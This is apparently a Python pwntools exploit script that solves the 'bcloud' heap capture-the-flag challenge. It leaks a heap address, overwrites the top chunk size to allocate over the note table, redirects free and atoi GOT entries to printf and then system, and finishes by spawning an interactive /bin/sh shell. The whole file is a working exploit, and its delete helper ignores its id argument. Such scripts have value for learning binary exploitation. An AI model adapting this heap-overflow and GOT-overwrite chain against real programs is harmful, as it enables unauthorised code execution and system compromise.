from pwn import *

p = process("./bcloud")
elf = ELF("./bcloud")
libc = ELF("./libc.so.6")
context.log_level = 'debug'

def welcome(name, org, host):
    p.recvuntil("name:\n")
    p.send(name)
    chunkfirst = u32(p.recvuntil("! Welcome")[-13:-9])
    log.info("chunkfirst: %s" % hex(chunkfirst))
    p.recvuntil("Org:\n")
    p.send(org)
    p.recvuntil("Host:\n")
    p.sendline(host)
    return chunkfirst

def new(length, content):
    p.recvuntil("--->>")
    p.sendline("1")
    p.recvuntil("Input the length of the note content:\n")
    p.sendline(str(length))
    p.recvuntil("Input the content:\n")
    p.send(content)

def show():
    p.recvuntil("--->>")
    p.sendline("2")

def edit(id, newcontent):
    p.recvuntil("--->>")
    p.sendline("3")
    p.recvuntil("id:\n")
    p.sendline(str(id))
    p.recvuntil("new content:\n")
    p.sendline(newcontent)

def delete(id):
    p.recvuntil("--->>")
    p.sendline("4")
    p.recvuntil("id:\n")
    p.sendline(str(0))

#part one
# gdb.attach(p)
name = "Bill"*0x10
org = "A" * 0x40
host = p32(0xffffffff)
leak = welcome(name, org, host)

#part two
bss = 0x804b0a0
length = bss - 8 - (leak + 0x48*3 - 8) - 8
newcontent=''
new(length, newcontent)
#edit(0, "B"*20)
#delete(0)


#part three
printf = elf.plt['printf']
free = elf.got['free']
atoi = elf.got['atoi']

payload = "A"*128 + p32(atoi) + p32(free) + p32(atoi)
length = len(payload)
new(length, payload)
edit(1, p32(printf))
delete(0)

# part four

real_atoi = u32(p.recv()[0:4])
log.info("readatoi: %s" % hex(real_atoi))
system = real_atoi - (libc.symbols['atoi'] - libc.symbols['system'])
edit(2, p32(system))
length = "/bin/sh\x00"

p.recvuntil("--->>")
p.sendline("1")
p.recvuntil("Input the length of the note content:\n")
p.sendline(str(length))
p.interactive()
